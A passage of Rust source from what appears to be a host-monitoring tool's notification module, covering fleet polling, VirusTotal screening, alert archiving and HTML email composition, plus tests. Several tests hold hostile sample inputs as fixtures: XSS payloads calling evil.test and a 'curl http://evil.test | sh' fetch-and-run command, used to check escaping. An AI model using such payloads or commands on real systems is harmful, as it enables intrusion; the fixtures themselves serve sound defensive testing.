    /// can tell "nothing was malicious" from "nothing was checked".
    pub unavailable: usize,
}

impl VtOutcome {
    #[must_use]
    pub fn line(&self) -> Option<String> {
        use std::fmt::Write as _;

        if self.looked_up == 0 {
            return None;
        }
        let mut s = format!("VirusTotal: {} hash(es) checked", self.looked_up);
        if self.flagged > 0 {
            let _ = write!(s, ", {} FLAGGED", self.flagged);
        }
        if self.unknown > 0 {
            // Without this, "2 checked" and nothing else reads as
            // "checked and fine", when it may mean VT has never seen
            // either hash — which is not reassurance.
            let _ = write!(s, ", {} unknown to VT", self.unknown);
        }
        if self.suppressed > 0 {
            let _ = write!(s, ", {} alert(s) held back as known-clean", self.suppressed);
        }
        if self.unavailable > 0 {
            let _ = write!(
                s,
                ", {} could not be checked (sent anyway)",
                self.unavailable
            );
        }
        Some(s)
    }
}

/// Decide an alert's fate given a `VirusTotal` verdict.
///
/// The safety property, stated as code: an alert is dropped **only** on
/// a positive clean verdict, and only when the operator asked for that.
/// Every other outcome — unknown hash, missing key, rate limit, network
/// failure — keeps the alert. A monitoring system must not fall silent
/// because a third-party API had a bad day.
#[must_use]
pub fn vt_decision(verdict: &crate::virustotal::Verdict, suppress_known_clean: bool) -> bool {
    if verdict.may_suppress() && suppress_known_clean {
        return false; // drop it
    }
    true // keep it
}

/// Does this alert clear the operator's filter?
#[must_use]
pub fn passes(alert: &Alert, filter: &FilterConfig) -> bool {
    if alert.suspicion < filter.min_suspicion {
        return false;
    }
    if filter.confirmed_only && !alert.confirmation.is_some_and(|c| c.confirmed) {
        return false;
    }
    true
}

// ---------------------------------------------------------------------------
// Run
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
pub struct RunArgs {
    pub operator_key: PathBuf,
    pub config_path: PathBuf,
    pub manifest_path: PathBuf,
    pub cursor_path: PathBuf,
    pub dry_run: bool,
    /// Write the HTML alternative here as well as (or instead of)
    /// sending it.
    pub html_out: Option<PathBuf>,
    /// Where to archive every polled alert. `None` disables archiving.
    pub archive_path: Option<PathBuf>,
}

/// Fail the run when the archive stopped working entirely.
///
/// Archiving is deliberately non-fatal per agent: the notification is
/// the load-bearing part, and one bad write must not stop the mail.
/// That is right, and it is also how six hours of history went missing
/// on a live fleet without anyone noticing — a schema change made every
/// insert fail, and the only trace was an hourly cron job's stderr.
///
/// So a *systematic* failure is reported as a failed run. One agent
/// failing is a blip; every agent failing means the archive is broken,
/// and the archive exists precisely because losing history quietly is
/// the thing to avoid.
fn archive_verdict(failures: usize, attempted: usize) -> Result<()> {
    if failures > 0 && failures == attempted {
        bail!(
            "sent, but archiving failed for all {attempted} agent(s); \
             no history was recorded for this run"
        );
    }
    if failures > 0 {
        eprintln!("notify: archiving failed for {failures} of {attempted} agent(s)");
    }
    Ok(())
}

/// Open the alert archive, or explain why not and carry on.
///
/// A failure here must never stop the mail going out. This runs on a
/// timer with nobody watching, and the notification is the load-bearing
/// part: losing history is bad, losing the alert is worse.
fn open_archive(path: Option<&Path>) -> Option<crate::archive::Archive> {
    let path = path?;
    match crate::archive::Archive::open(path) {
        Ok(a) => Some(a),
        Err(e) => {
            eprintln!("notify: alert archive unavailable ({e}); continuing without it");
            None
        }
    }
}

/// What one sweep of the fleet produced.
#[derive(Debug, Default)]
struct PollOutcome {
    hosts: Vec<HostAlerts>,
    /// Agents whose alerts could not be archived, and how many were
    /// polled at all. Losing history quietly is the failure the archive
    /// exists to prevent, so a sweep where *every* write failed is
    /// reported as a broken run even though the mail still goes out.
    archive_failures: usize,
    archived_agents: usize,
    /// Per-agent cursor to persist, but only after a successful send.
    advanced: BTreeMap<String, u64>,
    poll_failures: usize,
}

/// Drain every agent in the manifest into `hosts`, archiving as it goes.
///
/// Polling failures are counted and reported per agent rather than
/// returned: one unreachable host must not suppress alerts from the
/// rest of the fleet, which is precisely when the mail matters most.
async fn poll_fleet(
    args: &RunArgs,
    cfg: &NotifyConfig,
    manifest: &Manifest,
    cursors: &Cursors,
    mut archive: Option<&mut crate::archive::Archive>,
    out: &mut PollOutcome,
) {
    let PollOutcome {
        hosts,
        advanced,
        poll_failures,
        archive_failures,
        archived_agents,
    } = out;
    for peer in &manifest.peers {
        let Some(addr_str) = peer.addr.as_deref() else {
            continue; // fan-out-only entry, nothing to dial
        };
        let addr = match addr_str.parse() {
            Ok(a) => a,
            Err(e) => {
                eprintln!("notify: peer {} has an unusable addr: {e}", peer.name);
                *poll_failures += 1;
                continue;
            }
        };
        let since = cursors.since(&peer.fp);
        match crate::alerts::poll_once(&args.operator_key, addr, &peer.fp, &peer.pubkey_b64, since)
            .await
        {
            Ok((alerts, cursor)) => {
                // Archive first, and archive *everything* — before the
                // operator's filter and before the episode collapse.
                //
                // The filter says what is worth waking someone for; the
                // archive says what was observed. Conflating them means
                // raising `min_suspicion` silently erases history, and
                // the low-scoring alert nobody wanted emailed is
                // routinely the one that matters in hindsight.
                if let Some(a) = archive.as_deref_mut() {
                    *archived_agents += 1;
                    if let Err(e) = a.record(&alerts, Some(&peer.name)) {
                        eprintln!("notify: archiving {} failed: {e:#}", peer.name);
                        *archive_failures += 1;
                    }
                }
                let kept: Vec<Alert> = dedup_by_episode(
                    alerts
                        .into_iter()
                        .filter(|a| passes(a, &cfg.filter))
                        .collect(),
                );
                advanced.insert(peer.fp.clone(), cursor);
                if !kept.is_empty() {
                    hosts.push(HostAlerts {
                        host: peer.name.clone(),
                        alerts: kept,
                    });
                }
            }
            Err(e) => {
                eprintln!("notify: polling {} failed: {e}", peer.name);
                *poll_failures += 1;
            }
        }
    }
}

/// Poll every agent in the manifest, and email whatever is new.
///
/// # Errors
///
/// Any failure to load config, or to send. Polling failures for an
/// individual agent are reported and skipped — one unreachable host
/// must not suppress alerts from the rest of the fleet, which is
/// precisely when you most want the mail to arrive.
pub async fn run(args: &RunArgs) -> Result<()> {
    let cfg = NotifyConfig::load(&args.config_path)?;
    let manifest = Manifest::load(&args.manifest_path)?;
    let mut cursors = Cursors::load(&args.cursor_path)?;

    if manifest.peers.is_empty() {
        bail!(
            "peer manifest {} is empty; add agents with `bowery peers add`",
            args.manifest_path.display()
        );
    }

    let mut outcome = PollOutcome::default();

    let mut archive = open_archive(args.archive_path.as_deref());

    poll_fleet(
        args,
        &cfg,
        &manifest,
        &cursors,
        archive.as_mut(),
        &mut outcome,
    )
    .await;
    let PollOutcome {
        mut hosts,
        advanced,
        poll_failures,
        archive_failures,
        archived_agents,
    } = outcome;

    if hosts.is_empty() {
        // Still advance cursors: alerts below the filter were seen and
        // consciously skipped, and replaying them next run would mean
        // the filter never takes effect.
        for (fp, cursor) in advanced {
            cursors.by_fp.insert(fp, cursor);
        }
        cursors.save(&args.cursor_path)?;
        archive_verdict(archive_failures, archived_agents)?;
        if poll_failures > 0 {
            bail!("no alerts to send, but {poll_failures} agent(s) could not be polled");
        }
        return Ok(());
    }

    // VirusTotal screening. Only ever removes alerts on a positive
    // clean verdict; a missing key, a spent quota or an API outage
    // leaves the digest exactly as it was.
    let (vt, verdicts) = screen_with_virustotal(&cfg, &mut hosts).await;
    if hosts.iter().all(|h| h.alerts.is_empty()) {
        for (fp, cursor) in advanced {
            cursors.by_fp.insert(fp, cursor);
        }
        cursors.save(&args.cursor_path)?;
        if let Some(line) = vt.line() {
            println!("notify: nothing to send — {line}");
        }
        return Ok(());
    }

    let subject = subject(&hosts, &verdicts);
    let (body, html) = compose(&hosts, &verdicts, vt.line().as_deref());

    if let Some(path) = &args.html_out {
        fs::write(path, &html)
            .with_context(|| format!("writing HTML preview to {}", path.display()))?;
        println!("notify: wrote HTML preview to {}", path.display());
    }

    if args.dry_run {
        println!("--- would send ---");
        println!("To: {}", cfg.email.to.join(", "));
        println!("Subject: {subject}");
        println!("\n{body}");
        println!("--- html alternative ({} bytes) ---", html.len());
        println!("--- cursors NOT advanced (dry run) ---");
        return Ok(());
    }

    send_email(&cfg, &subject, &body, &html).await?;

    // Only now. A cursor advanced before a successful send would drop
    // the alerts on the floor: the inbox has already handed them over,
    // and nothing re-delivers.
    for (fp, cursor) in advanced {
        cursors.by_fp.insert(fp, cursor);
    }
    cursors.save(&args.cursor_path)?;

    let total: usize = hosts.iter().map(|h| h.alerts.len()).sum();
    println!("notify: emailed {total} alert(s) to {}", cfg.email.to.len());
    archive_verdict(archive_failures, archived_agents)?;
    if poll_failures > 0 {
        bail!("sent, but {poll_failures} agent(s) could not be polled");
    }
    Ok(())
}

/// Look up each alert's binary and drop the ones no engine flags.
///
/// Returns what happened, for the digest to report. Never returns an
/// error: a failure here must leave the alerts alone rather than
/// abort the run.
async fn screen_with_virustotal(
    cfg: &NotifyConfig,
    hosts: &mut [HostAlerts],
) -> (VtOutcome, VerdictMap) {
    use crate::virustotal::{VtCache, VtClient, default_cache_path, now_unix_s, read_api_key};

    let mut outcome = VtOutcome::default();
    let mut verdicts = VerdictMap::new();
    if !cfg.virustotal.enabled {
        return (outcome, verdicts);
    }
    let Some(key_path) = cfg.virustotal.api_key_file.as_ref() else {
        eprintln!("notify: [virustotal] enabled but no api_key_file; skipping screening");
        return (outcome, verdicts);
    };
    let key = match read_api_key(&expand_tilde(key_path)) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("notify: VirusTotal key unusable ({e}); sending unscreened");
            return (outcome, verdicts);
        }
    };
    let Ok(client) = VtClient::new(key) else {
        eprintln!("notify: could not build the VirusTotal client; sending unscreened");
        return (outcome, verdicts);
    };

    let cache_path = cfg
        .virustotal
        .cache_file
        .clone()
        .map_or_else(default_cache_path, |p| expand_tilde(&p));
    let mut cache = VtCache::load(&cache_path);
    let now = now_unix_s();
    let mut budget = cfg.virustotal.max_lookups;

    for host in hosts.iter_mut() {
        let mut kept: Vec<Alert> = Vec::with_capacity(host.alerts.len());
        for alert in std::mem::take(&mut host.alerts) {
            if alert.exe_sha256_hex.is_empty() {
                kept.push(alert);
                continue;
            }
            let verdict = if let Some(v) = cache.get(&alert.exe_sha256_hex, now) {
                v
            } else if budget == 0 {
                // Out of budget is not a clean bill of health.
                outcome.unavailable += 1;
                kept.push(alert);
                continue;
            } else {
                budget -= 1;
                let v = client.lookup(&alert.exe_sha256_hex).await;
                cache.put(&alert.exe_sha256_hex, &v, now);
                v
            };
            outcome.looked_up += 1;
            if verdict.is_malicious() {
                outcome.flagged += 1;
            }
            match &verdict {
                Verdict::Unavailable(_) => outcome.unavailable += 1,
                Verdict::Unknown => outcome.unknown += 1,
                _ => {}
            }
            verdicts.insert(alert.exe_sha256_hex.to_ascii_lowercase(), verdict.clone());
            if vt_decision(&verdict, cfg.virustotal.suppress_known_clean) {
                kept.push(alert);
            } else {
                outcome.suppressed += 1;
            }
        }
        // A VirusTotal hit leads the host's list. An operator reading
        // on a phone should not have to scroll past clean findings to
        // reach the one an engine flagged.
        kept.sort_by_key(|a| {
            !verdicts
                .get(&a.exe_sha256_hex.to_ascii_lowercase())
                .is_some_and(Verdict::is_malicious)
        });
        host.alerts = kept;
    }
    if let Err(e) = cache.save(&cache_path) {
        eprintln!("notify: could not save the VirusTotal cache: {e}");
    }
    (outcome, verdicts)
}

/// Build the `multipart/alternative` message.
///
/// Separate from sending so the part order can be asserted: a client
/// picks the **last** alternative it understands, so the plain part
/// coming first is the whole reason the HTML is the one that renders.
/// Flip them and every client silently shows the text version.
fn compose_message(cfg: &NotifyConfig, subject: &str, text: &str, html: &str) -> Result<Message> {
    let mut builder = Message::builder()
        .from(
            cfg.email
                .from
                .parse()
                .with_context(|| format!("parsing [email] from = {:?}", cfg.email.from))?,
        )
        .subject(subject);
    for to in &cfg.email.to {
        builder = builder.to(to
            .parse()
            .with_context(|| format!("parsing recipient {to:?}"))?);
    }
    // The text part is not a stub — it is the whole digest, so a client
    // that refuses HTML loses formatting and nothing else.
    Ok(builder.multipart(
        MultiPart::alternative()
            .singlepart(
                SinglePart::builder()
                    .header(header::ContentType::TEXT_PLAIN)
                    .body(text.to_string()),
            )
            .singlepart(
                SinglePart::builder()
                    .header(header::ContentType::TEXT_HTML)
                    .body(html.to_string()),
            ),
    )?)
}

async fn send_email(cfg: &NotifyConfig, subject: &str, text: &str, html: &str) -> Result<()> {
    use lettre::transport::smtp::authentication::Credentials;
    use lettre::{AsyncSmtpTransport, AsyncTransport, Tokio1Executor};

    let password = cfg.password()?;
    let email = compose_message(cfg, subject, text, html)?;

    let creds = Credentials::new(cfg.email.username.clone(), password);
    let transport: AsyncSmtpTransport<Tokio1Executor> = if cfg.email.starttls {
        AsyncSmtpTransport::<Tokio1Executor>::starttls_relay(&cfg.email.smtp_host)
            .with_context(|| format!("configuring STARTTLS relay {}", cfg.email.smtp_host))?
            .port(cfg.email.smtp_port)
            .credentials(creds)
            .build()
    } else {
        AsyncSmtpTransport::<Tokio1Executor>::relay(&cfg.email.smtp_host)
            .with_context(|| format!("configuring TLS relay {}", cfg.email.smtp_host))?
            .port(cfg.email.smtp_port)
            .credentials(creds)
            .build()
    };

    // The error is deliberately not wrapped with the credential in
    // scope; lettre's SMTP errors carry server text, never the password.
    if let Err(e) = transport.send(email).await {
        let text = e.to_string();
        let hint = auth_hint(&text)
            .map(|h| format!("\n\nhint: {h}"))
            .unwrap_or_default();
        bail!(
            "sending via {}:{}: {text}{hint}",
            cfg.email.smtp_host,
            cfg.email.smtp_port
        );
    }
    Ok(())
}

/// Turn an SMTP rejection into something an operator can act on.
///
/// Authentication is where first runs fail, and the server's own text —
/// "Application-specific password required", say — assumes you already
/// know what that means and where to get one. Matched on response text
/// rather than a typed error because the useful distinctions live in the
/// enhanced status codes, which the SMTP crate does not model.
#[must_use]
pub fn auth_hint(err_text: &str) -> Option<&'static str> {
    let t = err_text.to_ascii_lowercase();
    if t.contains("application-specific password") || t.contains("invalidsecondfactor") {
        return Some(
            "Gmail rejects account passwords over SMTP. Create an App Password \
             (which requires 2-Step Verification on the account) at \
             https://myaccount.google.com/apppasswords — it is 16 lowercase \
             letters shown as 4 groups of 4. Store it WITHOUT the spaces in the \
             file named by [email] password_file.",
        );
    }
    if t.contains("username and password not accepted")
        || t.contains("invalid login")
        || t.contains("535")
    {
        return Some(
            "The relay rejected the credential. Check that [email] username is \
             the mailbox owning the password, and that the password file holds \
             only the password — no quotes, no comment, no trailing text.",
        );
    }
    if t.contains("must issue a starttls command") {
        return Some("The relay wants STARTTLS: set [email] starttls = true (port 587).");
    }
    if t.contains("wrong version number") || t.contains("record overflow") {
        return Some(
            "TLS failed in the way a port/mode mismatch usually looks: use \
             starttls = true with port 587, or starttls = false with port 465.",
        );
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use bowery_proto::AlertConfirmation;

    fn alert(episode: &str, suspicion: f32, confirmed: bool) -> Alert {
        Alert {
            originator_fp: vec![0xab; 32],
            rule_id: "cred.read_netrc".into(),
            episode_id: episode.into(),
            exe_sha256_hex: "ab".repeat(32),
            exe_path: "/tmp/payload".into(),
            suspicion,
            rationale: "exec from world-writable path".into(),
            suggested_actions: vec![],
            ts_unix_ms: 1_700_000_000_000,
            backend: "test".into(),
            confirmation: confirmed.then_some(AlertConfirmation {
                peers_asked: 3,
                peers_unseen: 3,
                peers_seen: 0,
                peers_no_reply: 0,
                peers_refused: 0,
                peers_incomparable: 0,
                peers_familiar: 0,
                quorum: 2,
                confirmed: true,
            }),
            context: Vec::new(),
        }
    }

    #[test]
    fn sanitize_strips_newlines_and_controls() {
        // A rationale that can inject a line break can forge structure
        // in the body — a fake "== otherhost" section, say.
        let nasty = "line one\nline two\r\n== fake-host (99 alerts)\ttab";
        let clean = sanitize(nasty, 200);
        assert!(!clean.contains('\n'), "{clean}");
        assert!(!clean.contains('\r'), "{clean}");
        assert!(!clean.contains('\t'), "{clean}");
        assert!(
            clean.contains("fake-host"),
            "content is kept, just flattened"
        );
    }

    /// The complaint that prompted this: a real credential-read
    /// rationale was cut mid-sentence at 160 characters, losing the half
    /// that tells the operator what to do.
    #[test]
    fn a_real_rationale_survives_the_email_intact() {
        let rationale = "credential-access read of /etc/shadow by /usr/sbin/sshd (pid 431853) \
             — the password hash database was read. Legitimate for `su`, `sudo`, `login` \
             and PAM; from anything else this is credential theft, and the hashes are \
             offline-crackable once taken";
        let out = labelled("why", &sanitize(rationale, RATIONALE_CAP));
        let flat: String = out
            .lines()
            .map(|l| {
                l.trim_start_matches(' ')
                    .trim_start_matches("why")
                    .trim_start_matches(':')
                    .trim()
            })
            .collect::<Vec<_>>()
            .join(" ");
        assert!(
            flat.contains("offline-crackable once taken"),
            "the tail of the rationale must reach the operator: {out}"
        );
        assert!(!out.contains('…'), "nothing this size should truncate");
    }

    /// The longest chain the agent can compose — analyzer verdict plus
    /// provenance, set-id, lineage, discovery and the repeat-fold note,
    /// each appending a clause.
    #[test]
    fn a_fully_chained_rationale_is_not_truncated() {
        let chained = [
            "pre-filter score above threshold (distro-packaged, unmodified)",
            "a setuid-root binary that no package owns. Distributions ship a short, \
             well-known set of these; one that arrived any other way is how a foothold \
             becomes permanent root without touching a service file",
            "nginx spawned /bin/sh: a network-facing service started an interactive shell \
             — the shape of a webshell or an exploited service, and something almost no \
             legitimate configuration does",
            "reconnaissance: 4212 ran 5 different discovery commands in quick succession \
             (whoami, id, uname, ss, netstat). Each is ordinary alone; together and this \
             fast they are someone working out what this host is and what it can reach",
        ]
        .join(" | ");
        assert!(
            chained.chars().count() < RATIONALE_CAP,
            "the cap must exceed the longest chain the agent composes ({} chars)",
            chained.chars().count()
        );
        assert!(!sanitize(&chained, RATIONALE_CAP).contains('…'));
    }

    // -----------------------------------------------------------------
    // The HTML alternative
    // -----------------------------------------------------------------

    /// The invariant this feature replaced. Before HTML, "the body is
    /// text/plain" was what made a crafted `rationale` unable to render
    /// as anything but text. Now the escaping is the only thing holding
    /// that line, so it gets a test naming the payload it must defuse.
    #[test]
    fn a_crafted_field_cannot_render_as_markup() {
        let mut a = alert("ep-1", 0.9, false);
        a.exe_path = "/tmp/<img src=x onerror=alert(1)>".into();
        a.rationale = "closes the card </div><script>fetch('//evil.test')</script>".into();
        a.rule_id = "rule\" onmouseover=\"steal()".into();
        a.context = vec![bowery_proto::Attribute {
            key: "argv".into(),
            value: "sh -c '<b>curl</b> http://evil.test | sh'".into(),
        }];
        let hosts = vec![HostAlerts {
            host: "otter1".into(),
            alerts: vec![a],
        }];
        let html = body_html(&hosts, &VerdictMap::new());

        // No payload may reach the document in a form that opens a tag
        // or closes an attribute. `onerror=` on its own is harmless once
        // the `<` is an entity, so what is asserted is that the raw
        // sequence never appears — not that the words don't.
        for raw in [
            "/tmp/<img src=x onerror=alert(1)>",
            "</div><script>",
            "rule\" onmouseover=\"steal()",
            "<b>curl</b>",
        ] {
            assert!(!html.contains(raw), "{raw:?} reached the body unescaped");
        }
        for tag in ["<img", "<script", "<b>"] {
            assert!(!html.contains(tag), "{tag:?} was formed from alert text");
        }
        // And the operator still gets to read what happened.
        assert!(html.contains("&lt;img src=x onerror=alert(1)&gt;"));
        assert!(html.contains("&lt;script&gt;"));
        assert!(html.contains("&quot; onmouseover=&quot;"));
    }

    /// Sanitise-then-escape, not the reverse. Capping an already-escaped
    /// string can cut an entity in half, which puts a bare `&` on the
    /// page and silently corrupts the tail of the value.
    #[test]
    fn capping_never_severs_an_escape_sequence() {
        // Every character expands to an entity, so an escape-then-cap
        // implementation is guaranteed to cut one.
        let out = field(&"<".repeat(4096), 64);
        assert_eq!(out.matches("&lt;").count(), 64, "64 values, whole: {out}");
        let tail = out.trim_end_matches(|c: char| c != ';');
        assert!(tail.ends_with(';'), "no half-written entity: {out}");
        assert!(!out.contains("&l;") && !out.contains("&am"), "{out}");
    }

    /// The complaint this work started from: the id an operator needs in
    /// order to silence an alert has to be in the message they are
    /// reading, next to a command they can run.
    #[test]
    fn html_carries_the_silence_handle_and_the_rule_it_covers() {
        let hosts = vec![HostAlerts {
            host: "otter1".into(),
            alerts: vec![alert("ep-abc123", 0.9, true)],
        }];
        let html = body_html(&hosts, &VerdictMap::new());
        assert!(html.contains("ep-abc123"), "episode id missing");
        assert!(html.contains("cred.read_netrc"), "rule id missing");
        assert!(
            html.contains("bowery alerts silence ep-abc123"),
            "the runnable command is the point: {html}"
        );
        assert!(
            html.contains(&format!("--agent-fp {}", "ab".repeat(32))),
            "the command must name the host that raised it"
        );

        // The text part is the fallback for the same message, so it
        // cannot be missing what the HTML has.
        let text = body(&hosts, &VerdictMap::new());
        assert!(text.contains("ep-abc123"));
        assert!(text.contains("cred.read_netrc"));
        assert!(text.contains("bowery alerts silence"));
        assert!(text.contains(&format!("fp={}", "ab".repeat(32))));
    }

    /// A remote fetch in an alert mail tells whoever serves it when the
    /// operator opened it — and the alert may be about that person.
    #[test]
    fn the_html_fetches_nothing_when_rendered() {
        let mut a = alert("ep-1", 0.9, true);
        a.exe_path = "/tmp/x".into();
        let hosts = vec![HostAlerts {
            host: "otter1".into(),
            alerts: vec![a],
        }];
        let html = body_html(&hosts, &VerdictMap::new());
        for forbidden in [
            "<img",
            "src=",
            "@import",
            "background-image",
            "<link",
            "url(",
        ] {
            assert!(!html.contains(forbidden), "{forbidden:?} would fetch");
        }
        // The one outbound URL is a link the operator chooses to click.
        assert_eq!(html.matches("href=").count(), 1);
        assert!(!html.contains("http://"), "no cleartext URL");
    }

    /// The `VirusTotal` link is built by concatenating a field into a
    /// URL. Escaping holds it today; validating the shape keeps it
    /// holding after the next edit.
    #[test]
    fn only_a_real_hash_becomes_a_virustotal_link() {
        let mut a = alert("ep-1", 0.9, false);
        a.exe_sha256_hex = "not-a-hash/../../evil".into();
        let hosts = vec![HostAlerts {
            host: "h".into(),
            alerts: vec![a],
        }];
        let html = body_html(&hosts, &VerdictMap::new());
        assert!(!html.contains("href="), "unhashlike value must not linkify");
        assert!(html.contains("not-a-hash"), "but must still be shown");
    }

    /// The help block is meant to be pasted. It shipped once with a
    /// blank line after every `\` continuation, which a shell joins into
    /// an empty argument and then treats the remainder as separate
    /// commands — so the "copy this" text ran `bowery alerts silence`
    /// with no flags and `--agent-addr` as a command of its own.
    #[test]
    fn the_pasteable_command_is_one_shell_invocation() {
        let lines: Vec<&str> = SILENCE_HELP_TEXT.lines().collect();
        let mut sawcont = false;
        for (i, l) in lines.iter().enumerate() {
            if !l.trim_end().ends_with('\\') {
                continue;
            }
            sawcont = true;
            let next = lines.get(i + 1).copied().unwrap_or("");
            assert!(
                !next.trim().is_empty(),
                "line {i} continues onto a blank line, which breaks the paste:\n{SILENCE_HELP_TEXT}"
            );
        }
        assert!(sawcont, "the command is expected to span lines");
        assert!(SILENCE_HELP_TEXT.contains("--fanout"));
        // A reason a shell will reject beats one it would accept: pasted
        // unedited, this must not sign a silence justified by nothing.
        assert!(SILENCE_HELP_TEXT.contains("<why this is benign>"));
    }

    /// Unbalanced tags are what a template edit breaks, and a mail
    /// client will not tell you — it renders the wreckage. Checked over
    /// a digest that exercises every optional branch, since an
    /// `if`-guarded block is where a stray `</div>` hides.
    #[test]
    fn every_tag_the_html_opens_is_closed() {
        let mut confirmed = alert("ep-1", 0.9, true);
        confirmed.context = vec![bowery_proto::Attribute {
            key: "argv".into(),
            value: "sh -c whoami".into(),
        }];
        let mut bare = alert("ep-2", 0.4, false);
        bare.exe_path = String::new();
        bare.exe_sha256_hex = String::new();
        bare.rule_id = String::new();
        bare.originator_fp = vec![0u8; 7]; // malformed: no silence command
        let mut unconfirmed = alert("ep-3", 0.6, false);
        unconfirmed.confirmation = Some(AlertConfirmation {
            peers_asked: 3,
            peers_unseen: 1,
            peers_seen: 1,
            peers_no_reply: 1,
            peers_refused: 0,
            peers_incomparable: 0,
            peers_familiar: 0,
            quorum: 2,
            confirmed: false,
        });
        let hosts = vec![HostAlerts {
            host: "otter1".into(),
            alerts: vec![confirmed, bare, unconfirmed],
        }];
        let mut vt = VerdictMap::new();
        vt.insert(
            "ab".repeat(32),
            Verdict::Malicious {
                malicious: 3,
                total: 70,
            },
        );
        let html = body_html(&hosts, &vt);

        let mut stack: Vec<&str> = Vec::new();
        let mut rest = html.as_str();
        while let Some(lt) = rest.find('<') {
            rest = &rest[lt + 1..];
            let end = rest.find('>').expect("every tag is closed with >");
            let (tag, after) = rest.split_at(end);
            rest = &after[1..];
            let name = tag
                .trim_start_matches('/')
                .split([' ', '\n'])
                .next()
                .unwrap_or("");
            if tag.starts_with('/') {
                assert_eq!(
                    stack.pop(),
                    Some(name),
                    "</{name}> does not close the open element"
                );
            } else if name != "br" {
                stack.push(name);
            }
        }
        assert!(stack.is_empty(), "left open: {stack:?}");
    }

    /// A client renders the **last** alternative it understands, so the
    /// plain part must come first or the HTML never shows. Also pins the
    /// charset: the digest is full of em dashes, and a part that lost
    /// its `utf-8` would arrive as mojibake with nothing failing.
    #[test]
    fn the_html_is_the_alternative_a_client_will_pick() {
        let cfg: NotifyConfig = toml::from_str(
            r#"
[email]
to        = ["op@example.test"]
from      = "bowery@example.test"
smtp_host = "smtp.example.test"
smtp_port = 587
username  = "bowery@example.test"
password_file = "/dev/null"
"#,
        )
        .expect("fixture config parses");
        let msg = compose_message(
            &cfg,
            "bowery: 1 alert",
            "0.92 — text\n",
            "<div>0.92 — html</div>",
        )
        .expect("message builds");
        let wire = String::from_utf8(msg.formatted()).expect("message is utf-8");

        let plain = wire.find("text/plain").expect("a text part");
        let rich = wire.find("text/html").expect("an html part");
        assert!(plain < rich, "plain must precede html:\n{wire}");
        assert_eq!(
            wire.matches("charset=utf-8").count(),
            2,
            "both parts:\n{wire}"
        );
        assert!(wire.contains("multipart/alternative"));
        // The em dash survives as quoted-printable UTF-8, not as `?`.
        assert!(wire.contains("=E2=80=94"), "em dash mangled:\n{wire}");
        // Alert text must not have reached a header.
        let headers = &wire[..wire.find("\r\n\r\n").unwrap_or(wire.len())];
        assert!(!headers.contains("0.92"), "body leaked into headers");
    }

    /// A `\`-continued string literal that loses its continuation
    /// collapses into a run of padding spaces, which reaches the reader
    /// as a gap mid-sentence. Cheap to assert, invisible in review, and
    /// it has now happened once.
    #[test]
    fn no_rendered_text_carries_source_indentation() {
        let mut a = alert("ep-1", 0.9, false);
        a.confirmation = Some(AlertConfirmation {
            peers_asked: 2,
            peers_unseen: 0,
            peers_seen: 0,
            peers_no_reply: 0,
            peers_refused: 0,
            peers_incomparable: 2,
            peers_familiar: 0,
            quorum: 2,
            confirmed: false,
        });
        let hosts = vec![HostAlerts {
            host: "otter1".into(),
            alerts: vec![a],
        }];
        let html = body_html(&hosts, &VerdictMap::new());
        // Each text node on its own: joining them would introduce runs
        // of spaces that are an artefact of the check, not the page.
        let nodes: Vec<&str> = html
            .split('>')
            .filter_map(|chunk| chunk.split('<').next())
            .map(str::trim)
            .filter(|t| !t.is_empty())
            .collect();
        for node in &nodes {
            assert!(
                !node.contains("  "),
                "a rendered string carries source indentation: {node:?}"
            );
        }
        assert!(
            nodes.iter().any(|n| n.contains("NOT CHECKED")),
            "badge missing from {nodes:?}"
        );
    }

    /// One agent failing to archive is a blip; every agent failing is a
    /// broken archive, and that must not exit zero.
    ///
    /// A schema change once made every insert fail on a live fleet. The
    /// mail kept going out — correctly, that is the load-bearing part —
    /// and six hours of history was lost with no signal anywhere except
    /// an hourly cron job's stderr.
    #[test]
    fn a_systematic_archive_failure_fails_the_run() {
        assert!(archive_verdict(0, 3).is_ok(), "nothing failed");
        assert!(
            archive_verdict(1, 3).is_ok(),
            "one agent failing must not stop the run"
        );
        let err = archive_verdict(3, 3).expect_err("all three failing is a broken archive");
        let text = err.to_string();
        assert!(text.contains("archiving failed"), "{text}");
        assert!(
            text.contains("no history was recorded"),
            "the message must say what was lost: {text}"
        );
        // Nothing attempted, nothing failed: archiving is off.
        assert!(archive_verdict(0, 0).is_ok());
    }

    /// A flood must not become a megabyte of HTML either.
    #[test]
    fn html_truncates_a_flood_the_same_way_the_text_does() {
        let hosts = vec![HostAlerts {
            host: "otter1".into(),
            alerts: (0..MAX_ENUMERATED + 7)
                .map(|i| alert(&format!("ep-{i}"), 0.9, false))
                .collect(),
        }];
        let html = body_html(&hosts, &VerdictMap::new());
        assert!(html.contains("and 7 more, not listed"));
        assert!(!html.contains("ep-30"), "past the cap must not render");
    }

    /// Bounded is not the same as uncapped. The rationale embeds strings
    /// the monitored host controls, so a compromised agent must not be
    /// able to mail its operator a megabyte.
    #[test]
    fn a_hostile_rationale_is_still_bounded() {
        let hostile = "A".repeat(5_000_000);
        let out = sanitize(&hostile, RATIONALE_CAP);
        assert!(out.chars().count() < RATIONALE_CAP + 64);
        assert!(out.contains("more characters"));
    }

    /// Wrapped lines are indented under the label rather than starting
    /// at column 0, so a continuation cannot be misread as a new field.
    #[test]
    fn wrapped_lines_are_indented_under_their_label() {
        let out = labelled("why", &"word ".repeat(80));
        let mut lines = out.lines();
        let first = lines.next().expect("a first line");
        assert!(first.starts_with("  why       : "), "{first}");
        for l in lines {
            assert!(
                l.starts_with("              ") && !l.trim_start().starts_with("why"),
                "continuation must be indented, got {l:?}"
            );
        }
        assert!(
            out.lines().all(|l| l.chars().count() <= WRAP_COLS),
            "no line may exceed the wrap column"
        );
    }

    /// A path or hash longer than the column budget is emitted whole: a
    /// split path is one an investigator cannot paste anywhere.
    #[test]
    fn an_overlong_single_token_is_not_broken() {
        let path = format!("/{}", "a".repeat(200));
        let out = labelled("exe", &path);
        assert!(out.contains(&path), "the token must survive unbroken");
    }

    #[test]
    fn sanitize_caps_length() {
        let long = "a".repeat(5000);
        let clean = sanitize(&long, 160);
        assert!(clean.starts_with(&"a".repeat(160)));
        assert!(!clean.contains(&"a".repeat(161)), "must not exceed the cap");
        // And it says how much was lost, so a bare "…" is never mistaken
        // for "and so on".
        assert!(clean.contains("4840 more characters"), "{clean}");
        assert!(clean.contains("bowery alerts"), "{clean}");
    }

    #[test]
